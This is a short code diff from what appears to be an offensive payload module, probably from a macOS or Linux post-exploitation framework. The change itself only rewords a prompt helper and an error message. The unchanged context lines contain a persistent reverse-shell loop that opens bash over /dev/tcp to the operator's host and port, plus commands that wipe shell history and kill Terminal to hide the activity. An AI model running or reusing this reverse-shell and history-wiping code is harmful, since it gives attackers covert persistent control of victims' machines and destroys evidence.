@@ -9,7 +9,7 @@ class payload:
 
 	def run(self,server):
 		while 1:
-			persistence = raw_input(h.info_general_raw("Make Persistent? (y/N): ")).lower()
+			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
 			if persistence == "y":
 				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				shell_clean = "history -wc;killall Terminal"
@@ -19,7 +19,7 @@ class payload:
 				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
-				h.info_error("invalid option: " + persistence)
+				h.info_error("Unrecognized option!")
 
 		shell_command += "history -wc;killall Terminal"
 		if os.path.exists("payloads") == False:
